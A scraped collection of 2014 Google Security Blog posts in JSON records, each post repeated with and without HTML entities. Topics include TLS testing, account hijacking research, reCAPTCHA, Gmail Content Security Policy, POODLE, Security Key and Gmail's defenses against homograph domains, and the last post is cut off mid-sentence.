{"website": "Google-Security", "title": "\nIntroducing nogotofail—a network traffic security testing tool\n", "author": [], "link": "https://security.googleblog.com/2014/11/introducing-nogotofaila-network-traffic.html", "abstract": "                            Google is committed to increasing the use of TLS/SSL in all applications and services. But &#8220; HTTPS everywhere &#8221; is not enough; it also needs to be used correctly. Most platforms and devices have secure defaults, but some applications and libraries override the defaults for the worse, and in some instances we&#8217;ve seen platforms make mistakes as well. As applications get more complex, connect to more services, and use more third party libraries, it becomes easier to introduce these types of mistakes.       The Android Security Team has built a tool, called  nogotofail , that provides an easy way to confirm that the devices or applications you are using are safe against known TLS/SSL vulnerabilities and misconfigurations. Nogotofail works for Android, iOS, Linux, Windows, Chrome OS, OSX, in fact any device you use to connect to the Internet. There&#8217;s an easy-to-use client to configure the settings and get notifications on Android and Linux, as well as the attack engine itself which can be deployed as a router, VPN server, or proxy.         We&#8217;ve been using this tool ourselves for some time and have worked with many developers to improve the security of their apps. But we want the use of TLS/SSL to advance as quickly as possible. Today, we&#8217;re releasing it as an  open source project , so anyone can test their applications, contribute new features, provide support for more platforms, and help improve the security of the Internet.            Posted by Chad Brubaker, Android Security Engineer                                        Google is committed to increasing the use of TLS/SSL in all applications and services. But “HTTPS everywhere” is not enough; it also needs to be used correctly. Most platforms and devices have secure defaults, but some applications and libraries override the defaults for the worse, and in some instances we’ve seen platforms make mistakes as well. As applications get more complex, connect to more services, and use more third party libraries, it becomes easier to introduce these types of mistakes.   The Android Security Team has built a tool, called nogotofail, that provides an easy way to confirm that the devices or applications you are using are safe against known TLS/SSL vulnerabilities and misconfigurations. Nogotofail works for Android, iOS, Linux, Windows, Chrome OS, OSX, in fact any device you use to connect to the Internet. There’s an easy-to-use client to configure the settings and get notifications on Android and Linux, as well as the attack engine itself which can be deployed as a router, VPN server, or proxy.    We’ve been using this tool ourselves for some time and have worked with many developers to improve the security of their apps. But we want the use of TLS/SSL to advance as quickly as possible. Today, we’re releasing it as an open source project, so anyone can test their applications, contribute new features, provide support for more platforms, and help improve the security of the Internet.     Posted by Chad Brubaker, Android Security Engineer      ", "date": "November 4, 2014"},
{"website": "Google-Security", "title": "\nBehind enemy lines in our war against account hijackers\n", "author": [], "link": "https://security.googleblog.com/2014/11/behind-enemy-lines-in-our-war-against.html", "abstract": "                            A  recent poll  in the U.S. showed that more people are concerned about being hacked than having their house robbed. That&#8217;s why we  continue to work hard  to keep Google accounts secure. Our defenses keep most bad actors out, and we&#8217;ve reduced hijackings by more than 99% over the last few years.    We monitor many potential threats, from mass hijackings (typically used to send lots of spam) to  state-sponsored attacks  (highly targeted, often with political motivations).    This week, we&#8217;re releasing a  study  of another kind of threat we&#8217;ve dubbed &#8220;manual hijacking,&#8221; in which professional attackers spend considerable time exploiting a single victim&#8217;s account, often causing financial losses. Even though they&#8217;re rare&#8212;9 incidents per million users per day&#8212;they&#8217;re often severe, and studying this type of hijacker has helped us improve our defenses against all types of hijacking.    Manual hijackers often get into accounts through  phishing : sending deceptive messages meant to trick you into handing over your username, password, and other personal info. For this study, we analyzed several sources of phishing messages and websites, observing both how hijackers operate and what sensitive information they seek out once they gain control of an account. Here are some of our findings:        Simple but dangerous:  Most of us think we&#8217;re too smart to fall for phishing, but our research found some fake websites worked a whopping 45% of the time. On average, people visiting the fake pages submitted their info 14% of the time, and even the most obviously fake sites still managed to deceive 3% of people. Considering that an attacker can send out millions of messages, these success rates are nothing to sneeze at.      Quick and thorough:  Around 20% of hijacked accounts are accessed within 30 minutes of a hacker obtaining the login info. Once they&#8217;ve broken into an account they want to exploit, hijackers spend more than 20 minutes inside, often changing the password to lock out the true owner, searching for other account details (like your bank, or social media accounts), and scamming new victims.      Personalized and targeted:  Hijackers then send phishing emails from the victim&#8217;s account to everyone in his or her address book. Since your friends and family think the email comes from you, these emails can be very effective. People in the contact list of hijacked accounts are 36 times more likely to be hijacked themselves.&nbsp;      Learning fast:  Hijackers quickly change their tactics to adapt to new security measures. For example, after we started asking people to answer questions (like &#8220; which city do you login from most often? &#8221;) when logging in from a suspicious location or device, hijackers almost immediately started phishing for the answers.       We&#8217;ve used the findings from this study, along with our ongoing research efforts, to improve the many account security systems we have in place. But we can use your help too.       Stay vigilant:  Gmail blocks the vast majority of spam and phishing emails, but be wary of messages asking for login information or other personal data. Never reply to these messages; instead,  report them  to us. When in doubt, visit websites directly (not through a link in an email) to review or update account information.      Get your account back fast:  If your account is ever at risk, it&#8217;s important that we have a way to get in touch with you and confirm your ownership. That&#8217;s why we strongly recommend you provide a  backup phone number  or a  secondary email address  (but make sure that email account uses a strong password and is kept up to date so it&#8217;s not released due to inactivity).      2-step verification:  Our free  2-step verification  service provides an extra layer of security against all types of account hijacking. In addition to your password, you&#8217;ll use your phone to prove you&#8217;re really you. We also recently added an option to log in with a physical  USB device .     Take a few minutes and visit the  Secure Your Account page , where you can make sure we&#8217;ve got backup contact info for you and confirm that your other security settings are up to date.        Posted by Elie Bursztein, Anti-Abuse Research Lead              click to see full-size infographic                                                  A recent poll in the U.S. showed that more people are concerned about being hacked than having their house robbed. That’s why we continue to work hard to keep Google accounts secure. Our defenses keep most bad actors out, and we’ve reduced hijackings by more than 99% over the last few years.  We monitor many potential threats, from mass hijackings (typically used to send lots of spam) to state-sponsored attacks (highly targeted, often with political motivations).  This week, we’re releasing a study of another kind of threat we’ve dubbed “manual hijacking,” in which professional attackers spend considerable time exploiting a single victim’s account, often causing financial losses. Even though they’re rare—9 incidents per million users per day—they’re often severe, and studying this type of hijacker has helped us improve our defenses against all types of hijacking.  Manual hijackers often get into accounts through phishing: sending deceptive messages meant to trick you into handing over your username, password, and other personal info. For this study, we analyzed several sources of phishing messages and websites, observing both how hijackers operate and what sensitive information they seek out once they gain control of an account. Here are some of our findings:  Simple but dangerous: Most of us think we’re too smart to fall for phishing, but our research found some fake websites worked a whopping 45% of the time. On average, people visiting the fake pages submitted their info 14% of the time, and even the most obviously fake sites still managed to deceive 3% of people. Considering that an attacker can send out millions of messages, these success rates are nothing to sneeze at. Quick and thorough: Around 20% of hijacked accounts are accessed within 30 minutes of a hacker obtaining the login info. Once they’ve broken into an account they want to exploit, hijackers spend more than 20 minutes inside, often changing the password to lock out the true owner, searching for other account details (like your bank, or social media accounts), and scamming new victims. Personalized and targeted: Hijackers then send phishing emails from the victim’s account to everyone in his or her address book. Since your friends and family think the email comes from you, these emails can be very effective. People in the contact list of hijacked accounts are 36 times more likely to be hijacked themselves.  Learning fast: Hijackers quickly change their tactics to adapt to new security measures. For example, after we started asking people to answer questions (like “which city do you login from most often?”) when logging in from a suspicious location or device, hijackers almost immediately started phishing for the answers.  We’ve used the findings from this study, along with our ongoing research efforts, to improve the many account security systems we have in place. But we can use your help too.  Stay vigilant: Gmail blocks the vast majority of spam and phishing emails, but be wary of messages asking for login information or other personal data. Never reply to these messages; instead, report them to us. When in doubt, visit websites directly (not through a link in an email) to review or update account information. Get your account back fast: If your account is ever at risk, it’s important that we have a way to get in touch with you and confirm your ownership. That’s why we strongly recommend you provide a backup phone number or a secondary email address (but make sure that email account uses a strong password and is kept up to date so it’s not released due to inactivity). 2-step verification: Our free 2-step verification service provides an extra layer of security against all types of account hijacking. In addition to your password, you’ll use your phone to prove you’re really you. We also recently added an option to log in with a physical USB device.  Take a few minutes and visit the Secure Your Account page, where you can make sure we’ve got backup contact info for you and confirm that your other security settings are up to date.  Posted by Elie Bursztein, Anti-Abuse Research Lead    click to see full-size infographic      ", "date": "November 6, 2014"},
{"website": "Google-Security", "title": "\nReady, aim, fire: an open-source tool to test web security scanners\n", "author": [], "link": "https://security.googleblog.com/2014/11/ready-aim-fire-open-source-tool-to-test.html", "abstract": "                            Securing modern web applications can be a daunting task&#8212;doubly so if they are built (quickly) with diverse languages and technology stacks. That&#8217;s why we run a multi-faceted product security program, which helps our engineers build and deploy secure software at every stage of the development lifecycle. As part of this effort, we have developed an internal web application security scanning tool, codenamed Inquisition (as  no bug expects it !).    The scanner is built entirely on Google technologies like Chrome and Google Cloud Platform, with support for the latest HTML5 features, a low false positive rate and ease of use in mind. We have discussed some of the technology behind this tool in  a talk at the Google Testing Automation Conference 2013 .    While working on this tool, we found we needed a synthetic testbed to both test our current capabilities and set goals for what we need to catch next. Today we&#8217;re announcing the open-source release of Firing Range, the results of our work (with  some help  from researchers at the Politecnico di Milano) in producing a test ground for automated scanners.    Firing Range is a Java application built on Google App Engine and contains a wide range of XSS and, to a lesser degree, other web vulnerabilities. Code is available on  github.com/google/firing-range , while a deployed version is at  public-firing-range.appspot.com .     How is it different from the many vulnerable test applications already available? Most of them have focused on creating realistic-looking testbeds for human testers; we think that with automation in mind it is more productive, instead, to try to exhaustively enumerate the contexts and the attack vectors that an application might exhibit. Our testbed doesn&#8217;t try to emulate a real application, nor exercise the crawling capabilities of a scanner: it&#8217;s a collection of unique bug patterns drawn from vulnerabilities that we have seen in the wild, aimed at verifying the detection capabilities of security tools.    We have used Firing Range both as a continuous testing aid and as a driver for our development, defining as many bug types as possible, including some that we cannot detect (yet!).     We hope that others will find it helpful in evaluating the detection capabilities of their own automated tools, and we certainly welcome any  contributions and feedbacks  from the broader security research community.     Posted by Claudio Criscione, Security Engineer                                    Securing modern web applications can be a daunting task—doubly so if they are built (quickly) with diverse languages and technology stacks. That’s why we run a multi-faceted product security program, which helps our engineers build and deploy secure software at every stage of the development lifecycle. As part of this effort, we have developed an internal web application security scanning tool, codenamed Inquisition (as no bug expects it!).  The scanner is built entirely on Google technologies like Chrome and Google Cloud Platform, with support for the latest HTML5 features, a low false positive rate and ease of use in mind. We have discussed some of the technology behind this tool in a talk at the Google Testing Automation Conference 2013.  While working on this tool, we found we needed a synthetic testbed to both test our current capabilities and set goals for what we need to catch next. Today we’re announcing the open-source release of Firing Range, the results of our work (with some help from researchers at the Politecnico di Milano) in producing a test ground for automated scanners.  Firing Range is a Java application built on Google App Engine and contains a wide range of XSS and, to a lesser degree, other web vulnerabilities. Code is available on github.com/google/firing-range, while a deployed version is at public-firing-range.appspot.com.   How is it different from the many vulnerable test applications already available? Most of them have focused on creating realistic-looking testbeds for human testers; we think that with automation in mind it is more productive, instead, to try to exhaustively enumerate the contexts and the attack vectors that an application might exhibit. Our testbed doesn’t try to emulate a real application, nor exercise the crawling capabilities of a scanner: it’s a collection of unique bug patterns drawn from vulnerabilities that we have seen in the wild, aimed at verifying the detection capabilities of security tools.  We have used Firing Range both as a continuous testing aid and as a driver for our development, defining as many bug types as possible, including some that we cannot detect (yet!).   We hope that others will find it helpful in evaluating the detection capabilities of their own automated tools, and we certainly welcome any contributions and feedbacks from the broader security research community.  Posted by Claudio Criscione, Security Engineer     ", "date": "November 18, 2014"},
{"website": "Google-Security", "title": "\nAre you a robot? Introducing “No CAPTCHA reCAPTCHA”\n", "author": ["Posted by Vinay Shet, Product Manager, reCAPTCHA"], "link": "https://security.googleblog.com/2014/12/are-you-robot-introducing-no-captcha.html", "abstract": "                             Posted by Vinay Shet, Product Manager, reCAPTCHA      reCAPTCHA  protects the websites you love from spam and abuse. So, when you go online&#8212;say, for some last-minute holiday shopping&#8212;you won't be competing with robots and abusive scripts to access sites. For years, we&#8217;ve prompted users to confirm they aren&#8217;t robots by asking them to read distorted text and type it into a box, like this:         But, we figured it would be easier to just directly ask our users whether or not they are robots&#8212;so, we did!  We&#8217;ve begun rolling out a new API that radically simplifies the reCAPTCHA experience. We&#8217;re calling it the &#8220;No CAPTCHA reCAPTCHA&#8221; and this is how it looks:             On websites using this new API, a significant number of users will be able to securely and easily verify they&#8217;re human without actually having to solve a CAPTCHA. Instead, with just a single click, they&#8217;ll confirm they are not a robot.         A brief history of CAPTCHAs&nbsp;     While the new reCAPTCHA API may sound simple, there is a high degree of sophistication behind that modest checkbox. CAPTCHAs have long relied on the inability of robots to solve distorted text.  However,  our research recently showed  that today&#8217;s Artificial Intelligence technology can solve even the most difficult variant of distorted text at 99.8% accuracy.  Thus distorted text, on its own, is no longer a dependable test.    To counter this, last year we  developed  an Advanced Risk Analysis backend for reCAPTCHA that actively considers a user&#8217;s entire engagement with the CAPTCHA&#8212;before, during, and after&#8212;to determine whether that user is a human.  This enables us to rely less on typing distorted text and, in turn, offer a better experience for users. &nbsp;We talked about this in our  Valentine&#8217;s Day post  earlier this year.    The new API is the next step in this steady evolution.  Now, humans can just check the box and in most cases, they&#8217;re through the challenge.     Are you  sure  you&#8217;re not a robot?     However, CAPTCHAs aren't going away just yet. In cases when the risk analysis engine can't confidently predict whether a user is a human or an abusive agent, it will prompt a CAPTCHA to elicit more cues, increasing the number of security checkpoints to confirm the user is valid.          Making reCAPTCHAs mobile-friendly     This new API also lets us experiment with new types of challenges that are easier for us humans to use, particularly on mobile devices. In the example below, you can see a CAPTCHA based on a classic  Computer Vision  problem of image labeling. In this version of the CAPTCHA challenge, you&#8217;re asked to select all of the images that correspond with the clue.  It's much easier to tap photos of cats or turkeys than to tediously type a line of distorted text on your phone.               Adopting the new API on your site     As more websites adopt the new API, more people will see \"No CAPTCHA reCAPTCHAs\". &nbsp;Early adopters, like&nbsp; Snapchat ,  WordPress ,  Humble Bundle , and several others are already seeing great results with this new API. For example, in the last week, more than 60% of WordPress&#8217; traffic and more than 80% of Humble Bundle&#8217;s traffic on reCAPTCHA encountered the No CAPTCHA experience&#8212;users got to these sites faster.  To adopt the new reCAPTCHA for your website,  visit our site  to learn more.    Humans, we'll continue our work to keep the Internet safe and easy to use.  Abusive bots and scripts, it&#8217;ll only get worse&#8212;sorry we&#8217;re (still) not sorry.                                   Posted by Vinay Shet, Product Manager, reCAPTCHA  reCAPTCHA protects the websites you love from spam and abuse. So, when you go online—say, for some last-minute holiday shopping—you won't be competing with robots and abusive scripts to access sites. For years, we’ve prompted users to confirm they aren’t robots by asking them to read distorted text and type it into a box, like this:   But, we figured it would be easier to just directly ask our users whether or not they are robots—so, we did!  We’ve begun rolling out a new API that radically simplifies the reCAPTCHA experience. We’re calling it the “No CAPTCHA reCAPTCHA” and this is how it looks:     On websites using this new API, a significant number of users will be able to securely and easily verify they’re human without actually having to solve a CAPTCHA. Instead, with just a single click, they’ll confirm they are not a robot.   A brief history of CAPTCHAs   While the new reCAPTCHA API may sound simple, there is a high degree of sophistication behind that modest checkbox. CAPTCHAs have long relied on the inability of robots to solve distorted text.  However, our research recently showed that today’s Artificial Intelligence technology can solve even the most difficult variant of distorted text at 99.8% accuracy.  Thus distorted text, on its own, is no longer a dependable test.  To counter this, last year we developed an Advanced Risk Analysis backend for reCAPTCHA that actively considers a user’s entire engagement with the CAPTCHA—before, during, and after—to determine whether that user is a human.  This enables us to rely less on typing distorted text and, in turn, offer a better experience for users.  We talked about this in our Valentine’s Day post earlier this year.  The new API is the next step in this steady evolution.  Now, humans can just check the box and in most cases, they’re through the challenge.  Are you sure you’re not a robot?  However, CAPTCHAs aren't going away just yet. In cases when the risk analysis engine can't confidently predict whether a user is a human or an abusive agent, it will prompt a CAPTCHA to elicit more cues, increasing the number of security checkpoints to confirm the user is valid.   Making reCAPTCHAs mobile-friendly  This new API also lets us experiment with new types of challenges that are easier for us humans to use, particularly on mobile devices. In the example below, you can see a CAPTCHA based on a classic Computer Vision problem of image labeling. In this version of the CAPTCHA challenge, you’re asked to select all of the images that correspond with the clue.  It's much easier to tap photos of cats or turkeys than to tediously type a line of distorted text on your phone.    Adopting the new API on your site  As more websites adopt the new API, more people will see \"No CAPTCHA reCAPTCHAs\".  Early adopters, like Snapchat, WordPress, Humble Bundle, and several others are already seeing great results with this new API. For example, in the last week, more than 60% of WordPress’ traffic and more than 80% of Humble Bundle’s traffic on reCAPTCHA encountered the No CAPTCHA experience—users got to these sites faster.  To adopt the new reCAPTCHA for your website, visit our site to learn more.  Humans, we'll continue our work to keep the Internet safe and easy to use.  Abusive bots and scripts, it’ll only get worse—sorry we’re (still) not sorry.     ", "date": "December 3, 2014"},
{"website": "Google-Security", "title": "\nReject the Unexpected - Content Security Policy in Gmail\n", "author": ["Posted by Danesh Irani, Software Engineer, Gmail Security"], "link": "https://security.googleblog.com/2014/12/reject-unexpected-content-security.html", "abstract": "                             Posted by Danesh Irani, Software Engineer, Gmail Security      (Cross-posted from the  Gmail Blog )     We know that the safety and reliability of your Gmail is super important to you, which is why we&#8217;re always working on security improvements like  serving images through secure proxy servers , and  requiring HTTPS . Today, Gmail on the desktop is becoming more secure with support for Content Security Policy (CSP). CSP helps provide a layer of defense against a common class of security vulnerabilities known as cross-site scripting (XSS).    There are many great extensions for Gmail. Unfortunately, there are also some extensions that behave badly, loading code which interferes with your Gmail session, or which compromises your email&#8217;s security. Gmail&#8217;s CSP helps protect you, by making it more difficult to load unsafe code into Gmail.    Most popular (and well-behaved) extensions have already been updated to work with the CSP standard, but if you happen to have any trouble with an extension, try installing its latest version from your browser&#8217;s web store (for example,  the Chrome Web Store  for Chrome users).    CSP is just another example of how Gmail can help make your email experience safer. For advice and tools that help keep you safe across the web, you can always visit the  Google Security Center .     This post was updated on December 18th to add a description of the XSS defense benefit of CSP, and to more precisely define the interaction with extensions.                                    Posted by Danesh Irani, Software Engineer, Gmail Security  (Cross-posted from the Gmail Blog)  We know that the safety and reliability of your Gmail is super important to you, which is why we’re always working on security improvements like serving images through secure proxy servers, and requiring HTTPS. Today, Gmail on the desktop is becoming more secure with support for Content Security Policy (CSP). CSP helps provide a layer of defense against a common class of security vulnerabilities known as cross-site scripting (XSS).  There are many great extensions for Gmail. Unfortunately, there are also some extensions that behave badly, loading code which interferes with your Gmail session, or which compromises your email’s security. Gmail’s CSP helps protect you, by making it more difficult to load unsafe code into Gmail.  Most popular (and well-behaved) extensions have already been updated to work with the CSP standard, but if you happen to have any trouble with an extension, try installing its latest version from your browser’s web store (for example, the Chrome Web Store for Chrome users).  CSP is just another example of how Gmail can help make your email experience safer. For advice and tools that help keep you safe across the web, you can always visit the Google Security Center.  This post was updated on December 18th to add a description of the XSS defense benefit of CSP, and to more precisely define the interaction with extensions.     ", "date": "December 16, 2014"},
{"website": "Google-Security", "title": "\nAn Update to End-To-End\n", "author": ["Posted by Stephan Somogyi, Product Manager, Security and Privacy"], "link": "https://security.googleblog.com/2014/12/an-update-to-end-to-end.html", "abstract": "                             Posted by Stephan Somogyi, Product Manager, Security and Privacy     In June, we  announced and launched End-To-End , a tool for those who need even more security for their communications than what we already provide. Today, we&#8217;re launching an updated version of our extension &#8212; still in alpha &#8212; that includes a number of changes:       We&#8217;re  migrating End-To-End to GitHub . We&#8217;ve always believed strongly that End-To-End must be an open source project, and we think that using GitHub will allow us to work together even better with the community.   We&#8217;ve included several contributions from Yahoo Inc. Alex Stamos, Yahoo&#8217;s Chief Security Officer, announced at BlackHat 2014 in August that his team would be participating in our End-To-End project; we&#8217;re very happy to release the first fruits of this collaboration.   We&#8217;ve added more documentation. The  project wiki  now contains additional information about End-To-End, both for developers as well as security researchers interested in understanding better how we think about End-To-End&#8217;s security model.&nbsp;      We&#8217;re very thankful to all those who submitted bugs against the first alpha release. Two of those bugs earned a financial reward through our  Vulnerability Rewards Program . One area where we didn&#8217;t receive many bug reports was in End-To-End&#8217;s new crypto library. On the contrary: we heard from several other projects who want to use our library, and we&#8217;re looking forward to working with them.&nbsp;     One thing hasn&#8217;t changed for this release: we aren&#8217;t yet making End-To-End available in the Chrome Web Store. We don&#8217;t feel it&#8217;s as usable as it needs to be. Indeed, those looking through the source code will see references to our key server, and it should come as no surprise that we&#8217;re working on one. Key distribution and management is one of the hardest usability problems with cryptography-related products, and we won&#8217;t release End-To-End in non-alpha form until we have a solution we&#8217;re content with.    We&#8217;re excited to continue working on these challenging and rewarding problems, and we look forward to delivering a more fully fledged End-to-End next year.                                   Posted by Stephan Somogyi, Product Manager, Security and Privacy  In June, we announced and launched End-To-End, a tool for those who need even more security for their communications than what we already provide. Today, we’re launching an updated version of our extension — still in alpha — that includes a number of changes:   We’re migrating End-To-End to GitHub. We’ve always believed strongly that End-To-End must be an open source project, and we think that using GitHub will allow us to work together even better with the community. We’ve included several contributions from Yahoo Inc. Alex Stamos, Yahoo’s Chief Security Officer, announced at BlackHat 2014 in August that his team would be participating in our End-To-End project; we’re very happy to release the first fruits of this collaboration. We’ve added more documentation. The project wiki now contains additional information about End-To-End, both for developers as well as security researchers interested in understanding better how we think about End-To-End’s security model.    We’re very thankful to all those who submitted bugs against the first alpha release. Two of those bugs earned a financial reward through our Vulnerability Rewards Program. One area where we didn’t receive many bug reports was in End-To-End’s new crypto library. On the contrary: we heard from several other projects who want to use our library, and we’re looking forward to working with them.    One thing hasn’t changed for this release: we aren’t yet making End-To-End available in the Chrome Web Store. We don’t feel it’s as usable as it needs to be. Indeed, those looking through the source code will see references to our key server, and it should come as no surprise that we’re working on one. Key distribution and management is one of the hardest usability problems with cryptography-related products, and we won’t release End-To-End in non-alpha form until we have a solution we’re content with.  We’re excited to continue working on these challenging and rewarding problems, and we look forward to delivering a more fully fledged End-to-End next year.     ", "date": "December 16, 2014"},
{"website": "Google-Security", "title": "\nNews from the land of patch rewards\n", "author": [], "link": "https://security.googleblog.com/2014/10/news-from-land-of-patch-rewards.html", "abstract": "                            It&#8217;s been a year since we  launched  our  Patch Reward  program, a novel effort designed to recognize and reward proactive contributions to the security of key open-source projects that make the Internet tick. Our goal is to provide financial incentives for improvements that go beyond merely fixing a known security bug.       We started with a modest scope and reward amounts, but have gradually expanded the program over the past few months. We&#8217;ve seen some great work so far&#8212;and to help guide future submissions, we wanted to share some of our favorites:       Incorporation of a  variety of web security checks  directly into Django to help users develop safer web applications.       A support for  seccomp-bpf sandboxing  in BIND to minimize the impact of remote code execution bugs.       Addition of  Curve25519  and several other primitives in OpenSSH to strengthen its cryptographic foundations and improve performance.       A set of patches to reduce the  likelihood of ASLR info leaks  in Linux to make certain types of memory corruption bugs more difficult to exploit.       And, of course, the recent  attack-surface-reducing  function prefix patch in bash that helped mitigate a flurry of &#8220;Shellshock&#8221;-related bugs.         We hope that this list inspires even more contributions in the year to come. Of course, before participating, be sure to  read the rules page . When done, simply send your nominations to  security-patches@google.com . And keep up the great work!          Posted by Michal Zalewski, Google Security Team                                      It’s been a year since we launched our Patch Reward program, a novel effort designed to recognize and reward proactive contributions to the security of key open-source projects that make the Internet tick. Our goal is to provide financial incentives for improvements that go beyond merely fixing a known security bug.   We started with a modest scope and reward amounts, but have gradually expanded the program over the past few months. We’ve seen some great work so far—and to help guide future submissions, we wanted to share some of our favorites:   Incorporation of a variety of web security checks directly into Django to help users develop safer web applications.   A support for seccomp-bpf sandboxing in BIND to minimize the impact of remote code execution bugs.   Addition of Curve25519 and several other primitives in OpenSSH to strengthen its cryptographic foundations and improve performance.   A set of patches to reduce the likelihood of ASLR info leaks in Linux to make certain types of memory corruption bugs more difficult to exploit.   And, of course, the recent attack-surface-reducing function prefix patch in bash that helped mitigate a flurry of “Shellshock”-related bugs.    We hope that this list inspires even more contributions in the year to come. Of course, before participating, be sure to read the rules page. When done, simply send your nominations to security-patches@google.com. And keep up the great work!    Posted by Michal Zalewski, Google Security Team     ", "date": "October 9, 2014"},
{"website": "Google-Security", "title": "\nThis POODLE bites: exploiting the SSL 3.0 fallback\n", "author": [], "link": "https://security.googleblog.com/2014/10/this-poodle-bites-exploiting-ssl-30.html", "abstract": "                            Today we are publishing  details  of a vulnerability in the design of SSL version 3.0. This vulnerability allows the plaintext of secure connections to be calculated by a network attacker. I discovered this issue in collaboration with Thai Duong and Krzysztof Kotowicz (also Googlers).    SSL 3.0 is nearly 18 years old, but support for it remains widespread. Most importantly, nearly all browsers support it and, in order to work around bugs in HTTPS servers, browsers will retry failed connections with older protocol versions, including SSL 3.0. Because a network attacker can cause connection failures, they can trigger the use of SSL 3.0 and then exploit this issue.    Disabling SSL 3.0 support, or CBC-mode ciphers with SSL 3.0, is sufficient to mitigate this issue, but presents significant compatibility problems, even today. Therefore our recommended response is to support  TLS_FALLBACK_SCSV . This is a mechanism that solves the problems caused by retrying failed connections and thus prevents attackers from inducing browsers to use SSL 3.0. It also prevents downgrades from TLS 1.2 to 1.1 or 1.0 and so may help prevent future attacks.    Google Chrome and our servers have supported TLS_FALLBACK_SCSV since February and thus we have good evidence that it can be used without compatibility problems. Additionally, Google Chrome will begin testing changes today that disable the fallback to SSL 3.0. This change will break some sites and those sites will need to be updated quickly.    In the coming months, we hope to remove support for SSL 3.0 completely from our client products.     Thank you to all the people who helped review and discuss responses to this issue.     Posted by Bodo Möller, Google Security Team         [ Updated   Oct 15  to note that SSL 3.0 is nearly 18 years old, not nearly 15 years old.]                                     Today we are publishing details of a vulnerability in the design of SSL version 3.0. This vulnerability allows the plaintext of secure connections to be calculated by a network attacker. I discovered this issue in collaboration with Thai Duong and Krzysztof Kotowicz (also Googlers).  SSL 3.0 is nearly 18 years old, but support for it remains widespread. Most importantly, nearly all browsers support it and, in order to work around bugs in HTTPS servers, browsers will retry failed connections with older protocol versions, including SSL 3.0. Because a network attacker can cause connection failures, they can trigger the use of SSL 3.0 and then exploit this issue.  Disabling SSL 3.0 support, or CBC-mode ciphers with SSL 3.0, is sufficient to mitigate this issue, but presents significant compatibility problems, even today. Therefore our recommended response is to support TLS_FALLBACK_SCSV. This is a mechanism that solves the problems caused by retrying failed connections and thus prevents attackers from inducing browsers to use SSL 3.0. It also prevents downgrades from TLS 1.2 to 1.1 or 1.0 and so may help prevent future attacks.  Google Chrome and our servers have supported TLS_FALLBACK_SCSV since February and thus we have good evidence that it can be used without compatibility problems. Additionally, Google Chrome will begin testing changes today that disable the fallback to SSL 3.0. This change will break some sites and those sites will need to be updated quickly.  In the coming months, we hope to remove support for SSL 3.0 completely from our client products.   Thank you to all the people who helped review and discuss responses to this issue.  Posted by Bodo Möller, Google Security Team  [Updated Oct 15 to note that SSL 3.0 is nearly 18 years old, not nearly 15 years old.]     ", "date": "October 14, 2014"},
{"website": "Google-Security", "title": "\nStrengthening 2-Step Verification with Security Key\n", "author": [], "link": "https://security.googleblog.com/2014/10/strengthening-2-step-verification-with.html", "abstract": "                                   2-Step Verification  offers a strong extra layer of protection for Google Accounts. Once enabled, you&#8217;re asked for a verification code from your phone in addition to your password, to prove that it&#8217;s really you signing in from an unfamiliar device. Hackers usually work from afar, so this second factor makes it much harder for a hacker who has your password to access your account, since they don&#8217;t have your phone.    Today we&#8217;re adding even stronger protection for particularly security-sensitive individuals.  Security Key  is a physical USB second factor that only works after verifying the login site is truly a Google website, not a fake site pretending to be Google. Rather than typing a code, just insert Security Key into your computer&#8217;s USB port and tap it when prompted in Chrome. When you sign into your Google Account using Chrome and Security Key, you can be sure that the cryptographic signature cannot be phished.           Security Key and Chrome incorporate the open  Universal 2nd Factor (U2F)  protocol from the  FIDO Alliance , so other websites with account login systems can get FIDO U2F working in Chrome today. It&#8217;s our hope that other browsers will add FIDO U2F support, too. As more sites and browsers come onboard, security-sensitive users can carry a single Security Key that works everywhere FIDO U2F is supported.    Security Key works with Google Accounts at no charge, but you&#8217;ll need to buy a compatible USB device directly from a U2F participating vendor. If you think Security Key may be right for you, we invite you to  learn more .     Posted by Nishit Shah, Product Manager, Google Security                                     2-Step Verification offers a strong extra layer of protection for Google Accounts. Once enabled, you’re asked for a verification code from your phone in addition to your password, to prove that it’s really you signing in from an unfamiliar device. Hackers usually work from afar, so this second factor makes it much harder for a hacker who has your password to access your account, since they don’t have your phone.  Today we’re adding even stronger protection for particularly security-sensitive individuals. Security Key is a physical USB second factor that only works after verifying the login site is truly a Google website, not a fake site pretending to be Google. Rather than typing a code, just insert Security Key into your computer’s USB port and tap it when prompted in Chrome. When you sign into your Google Account using Chrome and Security Key, you can be sure that the cryptographic signature cannot be phished.    Security Key and Chrome incorporate the open Universal 2nd Factor (U2F) protocol from the FIDO Alliance, so other websites with account login systems can get FIDO U2F working in Chrome today. It’s our hope that other browsers will add FIDO U2F support, too. As more sites and browsers come onboard, security-sensitive users can carry a single Security Key that works everywhere FIDO U2F is supported.  Security Key works with Google Accounts at no charge, but you’ll need to buy a compatible USB device directly from a U2F participating vendor. If you think Security Key may be right for you, we invite you to learn more.  Posted by Nishit Shah, Product Manager, Google Security     ", "date": "October 21, 2014"},
{"website": "Google-Security", "title": "\nProtecting Gmail in a global world\n", "author": [], "link": "https://security.googleblog.com/2014/08/protecting-gmail-in-global-world.html", "abstract": "                                     Last week  we announced support  for non-Latin characters in Gmail&#8212;think δοκιμή and 测试 and みんな&#8212;as a first step towards more global email. We&#8217;re really excited about these new capabilities. We also want to ensure they aren&#8217;t abused by spammers or scammers trying to send misleading or harmful messages.         Scammers can exploit the fact that  ဝ ,  ૦ , and  ο  look nearly identical to the letter  o , and by mixing and matching them, they can hoodwink unsuspecting victims.*&nbsp;Can you imagine the risk of clicking &#8220;Sh ဝ ppingSite&#8221; vs. &#8220;ShoppingSite&#8221; or &#8220;MyBank&#8221; vs. &#8220;MyB ɑ nk&#8221;?    To stay one step ahead of spammers, the Unicode community has identified suspicious combinations of letters that could be misleading, and Gmail will now begin rejecting email with such combinations. We&#8217;re using an open standard&#8212;the  Unicode Consortium &#8217; s &#8220;Highly Restricted&#8221; specification &#8212;which we believe strikes a healthy balance between legitimate uses of these new domains and those likely to be abused.         We&#8217;re rolling out the  changes  today, and hope that others across the industry will follow suit. Together, we can help ensure that international domains continue to flourish, allowing both users and businesses to have a  tête-à-tête  in the language of their choosing.     Posted by Mark Risher, Spam &amp; Abuse Team      *For those playing at home, that's a Myanmar letter Wa (U+101D), a Gujarati digit zero (U+AE6) and a Greek small letter omicron (U+03BF), followed by the ASCII letter 'o'.                                         Last week we announced support for non-Latin characters in Gmail—think δοκιμή and 测试 and みんな—as a first step towards more global email. We’re really excited about these new capabilities. We also want to ensure they aren’t abused by spammers or scammers trying to send misleading or harmful messages.    Scammers can exploit the fact that ဝ, ૦, and ο look nearly identical to the 